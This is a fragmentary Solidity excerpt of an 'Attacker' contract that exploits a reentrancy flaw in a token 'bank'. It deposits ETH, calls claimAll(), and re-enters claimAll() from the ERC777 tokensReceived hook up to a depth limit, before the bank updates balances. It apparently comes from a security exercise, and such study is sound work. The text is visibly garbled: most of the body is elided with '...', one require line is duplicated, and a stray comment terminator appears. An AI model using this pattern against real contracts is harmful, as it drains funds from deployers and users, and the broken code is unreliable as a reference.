...
contract Attacker is AccessControl, IERC777Recipient {
      ...
      require( address(bank) != address(0), "Target bank not set" );
		require(address(bank) != address(0), "Target bank not set");
   		require(msg.value == amt, "Must send exact amount");
    		...
    		// First deposit ETH to get a balance
		bank.deposit{value: amt}();
    
		// Now call claimAll() to start the reentrancy
		bank.claimAll();
	}
	...
	*/
	function tokensReceived(
		...
		// Only handle callbacks from our bank's token
		...
		if (depth < max_depth) {
			...
			// Reenter the vulnerable function before balance is updated
			bank.claimAll();
